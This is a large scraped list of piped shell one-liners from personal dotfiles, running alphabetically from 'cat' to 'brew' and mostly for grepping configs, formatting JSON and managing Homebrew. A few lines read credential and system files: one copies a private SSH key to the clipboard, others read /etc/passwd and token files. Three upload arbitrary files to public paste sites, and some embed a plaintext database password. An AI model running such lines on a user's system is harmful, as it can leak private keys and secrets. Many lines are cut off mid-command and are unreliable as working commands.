cat ~/.displayModes/acerhusl | disper --import
cat ~/.displayModes/Dellhusl | disper --import
cat ~/.displayModes/4C | disper --import
cat ~/.dirs | ruby -e \
cat ~/.css.txt | grep -i
cat ~/.copypasta3 | say &
cat ~/.copypasta2 | say &
cat ~/.copypasta | say &
cat ~/.config/zshhistory.log | grep
cat ~/.config/zsh/aliases.zsh | cut -d' ' -f 2-
cat ~/.config/vimb/history |grep -i
cat ~/.config/vimb/history | slit
cat ~/.config/nnn/.selection | tr '\0' '\n'
cat ~/.config/folder_shortcuts.txt | awk 'BEGIN { FS=\
cat ~/.config/dconf/user.d/*.dconf | dconf load /
cat ~/.config/customscripts/animations/pacmanbig | ruby -
cat ~/.config/customscripts/animations/pacman | ruby -
cat ~/.config/customscripts/animations/nyancat | ruby -
cat ~/.config/create_ap.conf | sudo create_ap -w2 --no-virt wlan0 eth0 --dhcp-dns 8.8.8.8 --daemon
cat ~/.config/create_ap.conf | sudo create_ap -w2 --no-virt wlan0 eth0 --dhcp-dns 8.8.8.8
cat ~/.communism | lolcat -p 0.8
cat ~/.common_shellrc.sh | less
cat ~/.comm.dat |grep
cat ~/.bashrc|grep alias; echo
cat ~/.bashrc|grep ^alias
cat ~/.bashrc| grep
cat ~/.bashrcfiles/alias | grep
cat ~/.bashrc ~/.bash_aliases | grep
cat ~/.bashrc |grep alias
cat ~/.bashrc |grep
cat ~/.bashrc | tail -n14
cat ~/.bashrc | more
cat ~/.bashrc | less
cat ~/.bashrc | grep alias
cat ~/.bashrc | grep ^alias
cat ~/.bashrc | grep -i
cat ~/.bashrc | grep 'alias'
cat ~/.bashrc | grep '^alias'
cat ~/.bashrc | grep $1
cat ~/.bashrc | grep
cat ~/.bash_profile | xclip -sel clip
cat ~/.bash_profile | grep alias
cat ~/.bash_profile | grep
cat ~/.bash_output|do-pipe-cfile-to-vim
cat ~/.bash_history|grep
cat ~/.bash_history_* | grep -i -E
cat ~/.bash_history.global | grep --text
cat ~/.bash_history | grep -i
cat ~/.bash_history | grep
cat ~/.bash_history | fzf-tmux
cat ~/.bash_history | $(percol)
cat ~/.bash_eternal_history | grep $@
cat ~/.bash_eternal_history | grep
cat ~/.bash_aliases ~/.bash_privatealiases | grep
cat ~/.bash_aliases | xclip -sel clip
cat ~/.bash_aliases | less
cat ~/.bash_aliases | grep mvn
cat ~/.bash_aliases | grep kubectl
cat ~/.bash_aliases | grep gradlew
cat ~/.bash_aliases | grep gcloud
cat ~/.bash_aliases | grep docker
cat ~/.bash_aliases | grep
cat ~/.bash/lib/hush.scpt | ssh heli osascript; echo hushed.
cat ~/.bash/conf/alias-init.bash | grep alias -n
cat ~/.aws/config | grep '\[profile'
cat ~/.ash_history | grep
cat ~/.apt.data |grep
cat ~/.aliases | grep docker
cat ~/.RENEGE | say &
cat |lolcat
cat | xsel --clipboard
cat | tw --pipe
cat | tr a-z A-Z
cat | pgp -feast matz
cat | pgp -f matz
cat | pbcopy ; sleep 1 ; pbpaste
cat | pbcopy
cat | nc localhost 2224
cat | nc -q1 localhost 2224
cat | nc -q0 localhost 2224
cat | column
cat | c - ; a
cat | base64 -d <<<
cat | base64 -D
cat xargs | less
cat volumes | while read LINE; do docker volume rm ${LINE}; done
cat todo.txt | grep
cat tmp/pids/server.pid | xargs kill -9
cat tmp/pids/server.pid | xargs -n1 -J pid kill -9 pid
cat tmp/pids/server.pid > /dev/null 2>/dev/null && (cat tmp/pids/server.pid 2> /dev/null | xargs kill -9 2> /dev/null && echo \
cat tips | convert text:- screen_background.png
cat serial.log | ${BUILDROOT}/util/colorize.sh
cat routes.txt | while read l; do echo $l; done
cat report.log | grep Error -A8 -n
cat readme* README* Readme* | less
cat qqq | xargs -n1 cvsdiff
cat project.files | gtags -f -
cat project-spec/meta-plnx-generated/conf/machine/plnx_*.conf | grep UBOOT_MACHINE
cat pdf | base64 --decode > decoded.pdf
cat pacman_backup.lst | xargs pacman -S --needed --noconfirm
cat packet.log | $TEST_GENERATOR $1 > test_code.txt
cat package.json| jq '.devDependencies'
cat package.json| jq '.dependencies'
cat package.json | underscore select
cat package.json | sed -n '/\
cat package.json | json version
cat package.json | jq .version
cat package.json | jq .scripts
cat package.json | jq .devDependencies
cat package.json | jq .dependencies
cat package.json | jq .
cat package.json | jq -r .scripts
cat package.json | jq -r '.scripts'
cat package.json | jq --sort-keys
cat package.json | jq '.scripts'
cat package.json | jq '.devDependencies'
cat package.json | jq '.dependencies'
cat package.json | grep version
cat package.json | grep 'scripts' -A 10
cat package.json | grep '^\s*\
cat package.json | grep
cat package.json | fx .scripts
cat package.json | fx .devDependencies
cat package.json | fx .dependencies
cat package.json | column
cat package.json | ack
cat output.txt | pbcopy
cat outbuffer.txt | ix
cat node_modules/$1/README.md > /dev/null 2> /dev/null && pandoc -f markdown_github - | lynx -stdin
cat model.learning_rates | grep \
cat mes* | grep -C 10 Error
cat maritime/app/com/papasofokli/maritime/controllers/datasync/SyncVersionHelper.scala | grep uuidlink
cat main.cpp | pbcopy; lg 'mcp'
cat macadd-manuf.txt | peco
cat logs/at.out*appvcom* |less
cat log/A.log | grep fhw > tmp
cat log.txt >> loghistory.txt; mfcs_hw9 2>&1 | tee log.txt
cat jobids | xargs scancel
cat install_manifest.txt | sudo xargs rm
cat in.txt | ./prog
cat gasoline.log | grep
cat games.txt | grep -i
cat experiment.txt | grep
cat dump_use.sql | mysql -u root -p usenix_drupal
cat dump_jacket.sql | mysql -u root -p jacket_drupal
cat dump_bm.sql | mysql -u root -p bm_drupal
cat dump.sql | mysql
cat dum | sort -n
cat cscope.files1 | xargs etags -a ;(cscope -b &> /dev/null ) ; create_TTT
cat cscope.files | xargs etags -a ;(cscope -b &> /dev/null ) ; create_TTT
cat cscope.files | xargs etags -a ; cscope -bqk ; create_TTT
cat contacts | grep
cat composer.json|grep version
cat composer.json | grep
cat classnotes >> allNotes;cat classnotes | setclip;echo '' > classnotes; echo 'Notes pushed'
cat backup.sql | docker exec -i CONTAINER /usr/bin/mysql -uroot -pyuewen DATABASE
cat alias.sh | grep alias
cat `ls | dmenu`
cat `ls -t|head -n2`
cat `ls -t|head -n1`
cat `ls -t|head -1`
cat `ls -t | head -1`
cat `ls -A1t | head -1`
cat `ls -1t | head -1`
cat `find . -type f` | wc -l
cat `find . -maxdepth 1 -type f | fzf`
cat \$(find . | fzf)
cat Wulf | base64 --decode
cat TODO | grep
cat PKGBUILD | grep pkgver=
cat <(printf 'connect\n\nS\n\n') - | JLinkExe -selectemubysn 518002451
cat <(list-aliases) <(list-functions) | sort
cat <(echo 'H') <(echo 'P') -|ed
cat <($(tail -1 $HISTFILE)) | vim -
cat 1.list | xargs -I % svn revert %
cat 1.diff | grep
cat /ws/TASK/.sbtools/p4syncinfo/mwfixes_files ; echo ; echo $(cat /ws/TASK/.sbtools/p4syncinfo/mwfixes_files | wc -l) fixed files ; echo
cat /var/www/'$app_name'/code/log/production.log | tail -n30
cat /var/spool/mail/$USER | less
cat /var/run/dmesg.boot | grep -i
cat /var/log/user-data.log | more
cat /var/log/secure | grep
cat /var/log/rc-local.log | more
cat /var/log/pacman.log |grep PACMAN
cat /var/log/pacman.log | grep installed
cat /var/log/pacman.log | grep \
cat /var/log/pacman.log | grep -iE installed
cat /var/log/pacman.log | grep -i upgraded
cat /var/log/pacman.log | grep -i installed
cat /var/log/pacman.log | fzf -e +s --reverse
cat /var/log/pacman.log | \grep
cat /var/log/nginx/error.log | tail -n30
cat /var/log/messages | grep local0.notice
cat /var/log/messages | grep
cat /var/log/mail.log | grep $1
cat /var/log/mail.err | tail
cat /var/log/dpkg.log | grep \
cat /var/log/dpkg.log | grep '\ install\ '
cat /var/log/auth.log | grep -v 'pam_unix(cron:session)'
cat /var/log/auth.log | grep 'ssh.*password'
cat /var/log/auth.log | grep $1
cat /var/log/apt/history.log | grep -C 1 Commandline
cat /var/log/apt/history.log | grep 'apt-get install'
cat /var/log/apache2/error.log | tail
cat /var/log/Xorg.0.log |grep WW
cat /var/log/Xorg.0.log |grep EE
cat /var/log/Xorg.0.log | egrep -n -T \
cat /var/log/$SYSLOG|fgrep -i
cat /var/db/pkg/installed|awk -F :
cat /uusoc/sys/doc/numbers /home/clake/docs/numbers.txt | less
cat /usr/src/linux/.config | grep -i
cat /usr/share/vim/vim74/doc/usr_*.txt | vim -
cat /usr/share/dict/words | grep -v \
cat /usr/share/dict/words | fzf-tmux -l 20% --multi --reverse
cat /usr/share/dict/words | fzf
cat /usr/share/cowsay/interjection | cowsay -f rms
cat /usr/portage/profiles/use.desc | grep
cat /usr/local/var/run/redis.pid | xargs kill -15
cat /usr/local/var/mongodb/mongod.lock | xargs kill -15
cat /usr/local/cuda/include/cudnn.h | grep CUDNN_MAJOR -A 2
cat /usr/local/bin/virtualenvwrapper.sh | grep function
cat /usr/local/bin/vi-cheatsheet | less
cat /usr/local/admin/etc/server.list|egrep -i
cat /usr/include/cudnn.h | grep CUDNN_MAJOR -A 2
cat /usr/include/boost/version.hpp | grep BOOST_LIB_VERSION
cat /usr/include/asm/unistd_32.h | egrep
cat /usr/include/asm-generic/errno*|grep -i
cat /usr/bin/cef3/debug.log | grep connectivity
cat /tmp/test.txt | xclip -selection clipboard
cat /tmp/out.md | setclip
cat /tmp/ly.log | grep INFO
cat /tmp/cookie_store | tail -n +5
cat /tmp/cheerlight | cut -d \
cat /sys/class/thermal/thermal_zone0/temp /sys/class/thermal/thermal_zone1/temp /sys/class/thermal/thermal_zone2/temp /sys/class/thermal/thermal_zone3/temp | awk '{print \
cat /sys/class/power_supply/BAT0/uevent | grep POWER_SUPPLY_CAPACITY=
cat /sys/class/power_supply/BAT0/uevent | grep CAPACITY
cat /sys/class/power_supply/BAT0/status /sys/class/power_supply/BAT0/capacity | tr '\n' ' '; echo '% '
cat /sys/class/power_supply/BAT0/charge_now|head -c -4
cat /sys/class/backlight/intel_backlight/max_brightness | sudo tee /sys/class/backlight/intel_backlight/brightness
cat /root/wpi_cnct_cmds.txt | zsh
cat /root/tucker_cnct_cmds.txt | zsh
cat /root/home_cnct_cmds.txt | zsh
cat /root/.zsh_history | grep -i
cat /proc/version | awk '{print $3}'
cat /proc/uptime| awk -F. '{run_days=$1 / 86400;run_hour=($1 % 86400)/3600;run_minute=($1 % 3600)/60;run_second=$1 % 60;printf(\
cat /proc/mounts | column -t
cat /proc/meminfo | sed -n 's/^MemTotal:[[:space:]]*\([[:digit:]]*\).*$/\1/p'
cat /proc/meminfo | grep Total
cat /proc/meminfo | grep MemFree
cat /proc/meminfo | grep Mem
cat /proc/meminfo | grep Dirty
cat /proc/meminfo | grep -i
cat /proc/loadavg | sed 's/\([0-9]*\.[0-9]*\) \([0-9]*\.[0-9]*\) \([0-9]*\.[0-9]*\) \([0-9]*\)\/\([0-9]*\) \([0-9]*\).*$/1-minute: \1\n5-minute: \2\n15-minute: \3\nCurrent KSE: \4\nTotal KSE: \5\nLast PID: \6/g'
cat /proc/cpuinfo |grep MHz
cat /proc/cpuinfo | less
cat /proc/cpuinfo | grep bogo
cat /proc/cpuinfo | grep \
cat /proc/cpuinfo | grep MHz
cat /proc/cpuinfo | grep --color=never MHz
cat /proc/cpuinfo | grep 'cpu MHz'
cat /proc/cpuinfo | grep
cat /proc/asound/card0/codec#0 | grep Codec
cat /proc/acpi/ibm/thermal | awk '{print \
cat /proc/acpi/battery/BAT1/state | grep
cat /private/etc/hosts | peco
cat /media/sf_vdata/192.168.20.7.old.txt |nkf -Luw
cat /media/donagh/3520-FD13/1donaghs-stuff/Dictionaries/Oxford_English_Dictionary/oxford_dict.txt | grep
cat /js/tmp/gem.lst | gri
cat /js/my/yum.lst | grepi
cat /js/my/rpm.lst | grepi
cat /js/my/gem.lst | grepi
cat /home/ubuntu/onos/apache-karaf-3.0.3/data/log/karaf.log | grep \
cat /home/smith/workshop/note/linux_note/command.txt | grep
cat /home/pi/.config/wisebot/config.json | jq .
cat /home/pi/.config/wisebot-core/schedulers.json | jq .
cat /home/pi/.config/wisebot-core/rules.json | jq .
cat /home/pi/.config/wisebot-core/devices.json | jq
cat /home/pi/.config/wisebot-core/base.json | jq .
cat /home/noah/bash/aliases.sh | less
cat /home/ncdulo/.zshrc | grep alias
cat /home/moka/.oh-my-zsh/aliases.zsh | grep -v aliases
cat /home/mixmix/Desktop/useful\ commands | less
cat /home/lukas/Dokumente/Milchenbach/2019/Film/ChunkInfo.txt | fzf
cat /home/logs/apache/error | tail
cat /home/khjh/Git/.i3/config | grep
cat /home/khjh/.zshrc | grep
cat /home/khjh/.config/ranger/rc.conf | grep
cat /home/khjh/.config/awesome/rc.lua | grep
cat /home/john/passive/bashcheatsheet | less
cat /home/ifs/beet | xclip
cat /home/eggshell/.ssh/id_rsa.pub | pbcopy
cat /home/den/Music/music | fzf
cat /home/co/.histfile | grep
cat /home/chris/.scripts/SkateWeight/calorie_index.txt | grep
cat /home/biu/php/var/run/php-fpm.pid | xargs kill -USR2
cat /home/biu/php/var/run/php-fpm.pid | xargs kill -INT
cat /home/andywxy/bin/updates.log | grep pkg
cat /home/alex/.zshrc | grep 'hash -d'
cat /etc/ultimaker_version |sed
cat /etc/services | grep -i
cat /etc/services | grep
cat /etc/resolv.conf | grep nameserver
cat /etc/php5/apache2/conf.d/20-xdebug.ini | grep zend_extension
cat /etc/passwords |grep
cat /etc/passwd | grep -o -P \
cat /etc/passwd | cut -d: -f1
cat /etc/passwd | cut -d : -f 1
cat /etc/passwd | column -ts:
cat /etc/passwd | awk -F \
cat /etc/passwd | awk -F ':' '{ print $1 }'
cat /etc/passwd | awk '/bash/{print}'
cat /etc/pacman.d/mirrorlist | less
cat /etc/os-release|grep VERSION_ID
cat /etc/orc/orc.conf | egrep -v
cat /etc/oratab | grep -v
cat /etc/mtab | column -t
cat /etc/hosts|grep
cat /etc/hosts_backup|sudo tee -a /etc/hosts >> /dev/null
cat /etc/hosts | grep -i --color=AUTO
cat /etc/hosts | grep -i
cat /etc/hosts | grep --color
cat /etc/hosts | grep
cat /etc/group |cut -d: -f1
cat /etc/fstab | column -t
cat /etc/bash.bashrc | grep alias
cat /etc/apt/sources.list | perl -ne \
cat /etc/apt/sources.list /etc/apt/sources.list.d/*.list | grep ppa $*
cat /etc/lsb-release /etc/os-release | grep VERSION=
cat /dev/video1 | xine stdin://
cat /dev/video0 | xine stdin://
cat /dev/urandom | tr -dc
cat /dev/urandom | tr -cd '\43-\171'
cat /dev/urandom | tr -cd '01'
cat /dev/urandom | hexdump -c
cat /dev/urandom | hexdump -C
cat /dev/urandom | hexdump
cat /dev/urandom | head -c
cat /dev/urandom | hd
cat /dev/urandom | env LC_CTYPE=C tr -cd
cat /dev/urandom | aplay
cat /dev/urandom | LC_CTYPE=C tr -dc
cat /dev/random | hexdump -d
cat /dev/random | hexdump -c
cat /dev/random | hexdump -b
cat /dev/random | hexdump
cat /dev/random | cpipe -ngr -vt > /dev/null
cat /dev/null | xclip -selection clipboard
cat /dev/clipboard | tee
cat /cygdrive/c/cygwin-cache/*/${cygmachinesuffix}/setup.ini |grep --color -i
cat /boot/config.txt | grep spi_overclock
cat /Users/slaroche/.bash_aliases | grep 'alias run'
cat /Users/radoslawcieciwa/.bash_profile | grep -e '()' -e 'alias'
cat /Users/osada/tmp/sanitized_mysql_table_data.sql | be rails db
cat /Users/kosuke/perl5/perlbrew/perls/perl-5.14.1/lib/5.14.1/darwin-2level/perllocal.pod | ruby -e
cat /Users/kig/Dropbox/Backups/Books/MIT-License | pbcopy
cat /Users/dperconti/slack_css.txt | sudo tee -a /Applications/Slack.app/Contents/Resources/app.asar.unpacked/src/static/ssb-interop.js
cat /Users/devin/programming/mei/blog_post/views/blog.erb|pbcopy
cat /Users/bcsergo/.zsh_history | peco
cat /Users/aljones/ITP/Year1/Semester2/Detourning/2Week/assignment/yahooQuestions.txt | say -v Fred
cat /20media/audio/music/.listing | grep -i
cat .vim_help|less
cat .unicode_characters | less
cat .tree | less
cat .ssh/id_rsa.pub | ssh -p 8822 64.62.163.189 -l ogrunner
cat .ruby-version | rbenv install
cat .nvmrc | nvm install
cat .history | grep --binary-file=text
cat .histfile | grep
cat .gitignore | xargs git rm --cached -r --ignore-unmatch -q --
cat .git/config | less
cat .git/config | grep url
cat .git/config | grep name
cat .env | sed s/=.*/=/g > .env.template
cat .env | sed
cat .bash_history | grep
cat .bash_history | awk
cat .bash_help|less
cat ./tmp/pids/server.pid | xargs kill
cat ./package.json | jq .scripts
cat ./log/$(ls -1 -tr ./log/ | tail -n 1)
cat ./dcp.txt | pbcopy
cat ./coverage/lcov-report/lcov.info | ./node_modules/coveralls/bin/coveralls.js
cat ./Gemfile.lock | grep
cat ../ramdisk.cpio | cpio -i
cat -v | iconv -c -t ascii
cat -n ~/etc/russian.txt | grep -i
cat -n ~/etc/greek.txt | grep -i
cat -n | less -R
cat - | while read cat; do say $cat; done
cat *access.log | cut -d '\
cat *access.log | awk -F\
cat *.md | pandoc --filter=$SIMPLEMATH -s --toc -o script.tex
cat *.md | pandoc --filter=$SIMPLEMATH -s --toc -o script.pdf --template=$TEMPLATE
cat ${menv_dir}/README | less
cat ${__DOTFILES}/''scripts/venv_cdaliases.sh | pyline.py -r '^\\s*#+\\s+.*' 'rgx and l'
cat ${XDG_CONFIG_HOME:-$HOME/.config}/nnn/.selection | tr '\0' '\n'
cat ${SSH_KEY} | ssh ${HOSTNAME} 'cat >> .ssh/authorized_keys'
cat ${SSH_KEY_PATH} | xc
cat ${HOME}/scripts/fsoc.ascii | nms -cas -f red
cat ${HOME}/etc/vimfiles/data/site/spell/custom-dictionary.utf-8.add ${HOME}/etc/vimfiles/data/site/spell/en_au-words.txt | sort -f
cat ${HOME}/dotfiles/doc/Document/useful_commands.sh | fzf --height 10
cat ${HOME}/.ssh/id_rsa.pub | pbcopy && echo 'Copied to clipboard.'
cat ${HOME}/.ssh/id_rsa.pub | pbcopy
cat ${HOME}/.ssh/id_rsa | pbcopy
cat ${HOME}/.shell.log | grep
cat ${HOME}/.mlocate/mlocate.db | /usr/bin/locate -d-
cat ${HOME}/.bash-local/local_env ${HOME}/.bash-local/local_aliases ${HOME}/.bash-local/local_func | less
cat ${DOTFILE_PATH}/lib/vscode/extensions.list | xargs -L 1 echo code --install-extension
cat ${ALIASPATH}/.aliasrc* | grep
cat ${1} | jq .
cat $shellrc | grep
cat $shellalias | grep
cat $rules | sudo iptables-restore -c
cat $log_file | grep ssid > /dev/null
cat $historyLogPath/custom* | fzf
cat $f | less -N
cat $WORKSPACE/vimrc/vimrc_minimal | cs
cat $WORKSPACE/vimrc/vim_hex | cs
cat $WARGAMES/scripts/env.sh | cs
cat $VRX_PROCFS_BASE_NAME/status/* | grep bOpen
cat $VRX_PROCFS_BASE_NAME/status/* | grep ++
cat $VRX_PROCFS_BASE_NAME/status/* | grep $1
cat $UMICH | pbcopy; ((sleep $CLEAR_CLIP; cl) &)
cat $TEX_FOLDER/tikzTemplate.tex | tocp
cat $SETTING_DIR/log | grep '`date +'%b %d'`'
cat $SCRIPT| grep $1
cat $RECENTLY_EDITED_FILES_LOG | sudo xargs ag 2> /dev/null
cat $PERSISTENT_HISTORY_STORAGE | grep --color
cat $OCP_TEST_CLUSTER_DIR/$OCP4_SEMVER/run/auth/kubeadmin-password | xclipc
cat $MASTER | pbcopy; ((sleep $CLEAR_CLIP; cl) &)
cat $MAIN_HOME/pro/fl/social/kan.js | xclip
cat $LOG_FILE_PATH | grep
cat $LOGFILE_TXT | ccze -h
cat $LOG | grep 'FORGERY FORWARD LOG'
cat $LOG | grep 'BAD OUTPUT LOG'
cat $LOG | grep 'BAD INPUT LOG'
cat $LOG | grep 'BAD FORWARD LOG'
cat $INFOMUNITY_HOME/target/checkstyle-result.xml | grep -B1 -A1 error
cat $HOME/shell/bash_profile | grep $1
cat $HOME/local/var/run/redis.pid |xargs kill -9
cat $HOME/dr/fun/itasoftware-puzzles/word.lst | grep
cat $HOME/bad-passwords/discord-token | xargs 6cord -t
cat $HOME/Documents/GitHubToken.txt | cclip
cat $HOME/Code/dotfiles/vscode/extensions.txt | xargs -n 1 code --install-extension
cat $HOME/.zshrc | peco
cat $HOME/.zshrc | grep -i
cat $HOME/.zsh_history |grep $1
cat $HOME/.tmux.conf | lolcat
cat $HOME/.ssh/id_rsa.pub | pbcopy
cat $HOME/.ssh/id_rsa.pub | copy
cat $HOME/.ssh/id_rsa.pub | cb
cat $HOME/.ssh/*.pub | pbcopy && echo 'Keys copied to clipboard'
cat $HOME/.profile | grep
cat $HOME/.password | gsa_login -p
cat $HOME/.history/* | grep
cat $HOME/.dotfiles/vim/doc/shortcuts.txt | less
cat $HOME/.dotfiles/template/LICENSE.txt | sed -e s/YEAR_POSITION/\`date +\
cat $HOME/.config/hub | yq '.[][0].oauth_token' -r
cat $HOME/.cache/saved_path | xargs cd
cat $HOME/.bashrc|grep 'alias '
cat $HOME/.bashrc | grep alias
cat $HOME/.bashrc | grep 'git'
cat $HOME/.bashrc | grep
cat $HOME/.bash_history | fzf
cat $HOME/.bash_aliases | grep ^alias
cat $HOME/$bcustom | less
cat $HISTFILE |awk 'BEGIN{FS=\
cat $HISTFILE | grep $1
cat $HISTFILE | grep
cat $HISTFILE | egrep
cat $DOTFILE_DIR/.scripts/brew_dump.sh | zsh
cat $DOTFILES_PATH/vscode/extensions.txt | xargs -L 1 code-insiders --install-extension
cat $DOTFILES_PATH/vscode/extensions.txt | xargs -L 1 code --install-extension
cat $DOTFILES/ruby/default-gems | xargs gem install
cat $DJ_TEST_OUT | ~/.test_coprophagia.py
cat $DEV/config/aliases | less
cat $CATTLE_ROOT/cattle.sql.dev | mysql -u root cattle
cat $CATALINA_HOME/logs/catalina.out | grep
cat $BV_ZAYNAR_DIR/tmp/pids/server.pid | xargs kill
cat $BV_CMS_DIR/tmp/pids/server.pid | xargs kill
cat $BREWLIST | grep -i
cat $BOOKMARK_FILE | grep -v '^#'
cat $BINARY_HOME/binary-totp-ssh-key.txt | $OATHGEN_HOME/oathgen_linux_x86_64 -s stdin
cat $BINARY_HOME/binary-last-pass.txt | $OATHGEN_HOME/oathgen_linux_x86_64 -s stdin
cat $APACHE_LOG | tail -20
cat $AIRFLOW_HOME/airflow-webserver.pid | xargs -9
cat $@ | curl -F 'sprunge=<-' http://sprunge.us
cat $@ | curl -F 'f:1=<-' ix.io
cat $@ | curl -F 'clbin=<-' https://clbin.com
cat $2 | protoc -I /Users/tdaole/Quantcast/bidding/protobuf /Users/tdaole/Quantcast/bidding/protobuf/data-update.proto --decode=AuctionManager
cat $1|sed
cat $1|python -m json.tool
cat $1| vault kv put $2 value=-
cat $1 |python -m json.tool
cat $1 | xpbcopy
cat $1 | python -mjson.tool
cat $1 | python -m json.tool
cat $1 | pbcopy
cat $1 | jq .
cat $1 | grep def
cat $1 | colorize
cat $1 | col -b > $1
cat $* |python -m json.tool
cat $(glsu | pick)
cat $(find .) 2>/dev/null | wc
cat $ | less
case a in x|
cari_terbaru_hari_ini | xargs -0 mv -t terbaru/
cargo watch -s 'clear; cargo check --tests --color=always 2>&1 | head -40'
cargo watch -s 'cargo check --color always 2>&1 | head -n 50'
cargo test 2>&1 | less
cargo test --color=always 2>&1 | less -K +F
cargo c --color=always 2>&1 | less
cargo build --color=always 2>&1 | less -K +F
cards list | grep -i
cap deploy:pending:diff | subl
cap -f lib/recipes/remote.rb remote:test | bin/rerun_false_positives.rb
calendar -A 0 -f ~/calendar/calendar.mark | sort'
calendar -A 0 -f /usr/share/calendar/calendar.mark | sort'
calendar -A 0 -f /usr/share/calendar/calendar.mark | sort
calendar -A 0 -f /usr/share/calendar/calendar.computer| sort
cal |lolcat -p 1
cal |grep -A7 -B7 --color=auto $(date +%d)
cal | lolcat
cal | grep -C6 \
cal | grep -C6 --color \
cal | grep -C6 --color '`date +'%-d'`'
cal | grep -C6 --color '\b$(date +%e)\b'
cal | grep -C6 --color $(date +%e)
cal | grep -C5 --color=auto
cal | grep -A7 -B7 --color=auto $(date +%d)
cal -n 3 | less
cal -A 2 -B 2 | grep -C6 --color '\b$(date +%e)\b'
c2ps -r -2 -p A4 -t 3 -d 0.25-f 8 -b -m \!* | lpr
c -Q | head -2
bzr status|head -23
bzr status -S | grep -v ^\?
bzr stat -SV | awk '{print \$NF}'
bzr log | less
bzr log -n0 | less
bzr diff | vim -d -R -
bzr di | colordiff
bzr cdiff | less -R -FX
bwr | fw
bwd | fw
bwatch 'git diff --color=always | head -n\$(( \$(tput lines) - 1 ))'
bwa mem $REF query.fa 2> progress.txt | grep -v @
bwa mem $REF mutated.fa 2> progress.txt | grep -v @
bwa mem $REF experiment.bwa.read1.fastq experiment.bwa.read2.fastq | bam > experiment.bam; samtools index experiment.bam
bwa mem $REF $REAL | bam > real.bam; samtools index real.bam
bw lock && echo -n 'nothing here' | xclip -se c
bw get password e4787648-6aa7-4855-b41a-a7eb017d31ae | xsel -b
bw generate | secure-pbcopy
bw generate -lusn --length 24 | pbcopy
bunzip2 | head -2
bunzip2 | head
bundle_wrapper teaspoon -d phantomjs -q --format=tap_y | tapout progress
bundle | grep -v Using
bundle show|grep
bundle show |grep
bundle show `bundle-gemname-list | peco`
bundle show --paths|xargs ctags -R -f tags
bundle show --paths | xargs grep -r
bundle show --paths | xargs ag
bundle open `bundle-gemname-list | peco`
bundle list | grep $1
bundle list | grep
bundle list --paths | ctags -L - .
bundle install; rake db:migrate; rake db:schema:dump; annotate; bundle exec rspec spec; rails_best_practices -f html --with-textmate; railroady --alphabetize --transitive --all-columns -M | dot -Tsvg > models.svg; open rails_best_practices_output.html; open coverage/index.html; open models.svg
bundle install | sort
bundle install --jobs 16 | lolcat
bundle exec ruby -e 'puts \$LOAD_PATH' | xargs grep -r
bundle exec ruby -e 'puts $:' | xargs grep -r
bundle exec rubocop -a \$(git diff master --name-only --diff-filter=AMCRU | grep -E \
bundle exec rubocop -P -f fi | xargs bundle exec rubocop -a
bundle exec rubocop $( git diff --name-only --diff-filter=AMRC | paste -s - ) --cache false
bundle exec rspec --bisect --seed 35576 spec/models/speed_grader_spec.rb spec/models/assignment_spec.rb spec/controllers/gradebooks_controller_spec.rb && echo 'RSpec Bisect Done!' | terminal-notifier -sound default
bundle exec rspec $(git status -s spec/ | cut -c4-)
bundle exec rake secret | xclip -sel clip
bundle exec rake routes |grep
bundle exec rake routes | peco
bundle exec rake routes | less
bundle exec rake routes | grep $@
bundle exec rake routes | grep
bundle exec rake routes | fzf
bundle exec rake routes | ack $@
bundle exec rake -T | grep
bundle exec rails personal:deploy[$(git symbolic-ref --short HEAD | grep -o
bundle -j4; echo a | bundle exec rake rails:update:bin
buku -p | more
buku -p | grep \
builtin printenv | sort
btcli list | grep -i
bspc node \$(bspc query -N -n .hidden | tail -n1) -g hidden=off
bspc node $(bspc query -N -n .hidden | head -n1) --flag hidden
browserify . | uglifyjs index.js --screw-ie8 --mangle --compress > /dev/null
brew_list_formula | fzf --height=40% --preview='brew info {}'
brew-graph --installed --highlight-leaves | dot -T png -o ~/brew-graph.png && open ~/brew-graph.png
brew upgrade | tee upgrade-$( date +%F ).log
brew update; brew upgrade; brew prune; brew cleanup; brew doctor | lolcat
brew update; brew upgrade; brew leaves | xargs brew cleanup
brew update; brew upgrade; brew cask upgrade; brew cleanup -s; brew doctor; brew missing; brew cask doctor; apm upgrade -c false; npm update -g; pip3 install --upgrade $(pip3 list -o --format=json | jq
brew update; brew list | xargs brew upgrade
brew update -v && brew upgrade && brew cask outdated --quiet | /usr/local/bin/gxargs --no-run-if-empty brew cask reinstall && brew cleanup && brew cask cleanup
brew update -all && brew upgrade --all ; brew cask list | xargs brew cask install ; brew cleanup
brew update && brew upgrade brew-cask && brew cleanup && brew cask cleanup && (brew cask list | xargs brew cask install --force)
brew update && brew upgrade --all && brew cask list | xargs brew cleanup; brew cask cleanup; brew doctor
brew update && brew upgrade && upgrade_oh_my_zsh && rvm @global do gem update \`gem list | cut -d ' ' -f 1\` && rvm-update && vim -c 'BundleInstall!'
brew update && brew upgrade && brew cask update && brew doctor | terminal-notifier -message
brew update && brew upgrade && brew cask list | xargs brew cask install --force && brew cleanup --force && brew cask cleanup --force
brew update && brew list | xargs brew install
brew update && brew fetch --deps --retry $(brew outdated |cut -f 1)
brew services list | grep
brew outdated | xargs brew upgrade
brew outdated | xargs brew install
brew outdated | while read cask; do brew upgrade $cask; done
brew outdated | tail
brew list | xargs brew remove --force --ignore-dependencies
brew list | xargs brew reinstall
brew list | xargs brew deps --tree
brew list | while read cask; do printf \
brew list | rg
brew list | less
brew list | grep
brew list | column -t
brew list | ag
brew list | ack
brew list -1 | xargs brew rm
brew list -1 | while read line; do brew unlink $line; brew link --overwrite $line; done
brew list -1 | while read line; do brew unlink $line; brew link --force $line; done
brew list -1 | while read line; do brew unlink $line; brew link $line; done
brew list -1 | while read line; do brew unlink $line --force; brew link --force --overwrite $line; done
brew list -1 | more
brew leaves | xargs brew deps --installed --for-each
brew leaves | xargs brew cleanup; rm -rf $(brew --cache)
brew leaves | pbcopy
brew graph --installed | dot -Tpng -ograph.png && open graph.png
brew graph --installed --highlight-leaves | fdp -Tpng -ograph.png && open graph.png
brew graph --installed --highlight-leaves | fdp -Tpng -ograph.png
brew graph --installed --highlight-leaves | fdp -Tpng -o/tmp/brew-graph.png ; open /tmp/brew-graph.png
brew graph --installed --highlight-leaves | dot -Tpng -o/tmp/brew-graph.png ; open /tmp/brew-graph.png
brew deps --tree --installed | grep .
brew deps --installed | GREP_COLOR=\
brew cleanup && brew update && brew upgrade && brew doctor `brew doctor --list-checks | grep -v stray_headers`
brew cask outdated | xargs brew cask reinstall
brew cask outdated --greedy --verbose | grep -v \
brew cask list | xargs brew cask reinstall
brew cask list | xargs brew cask install --force
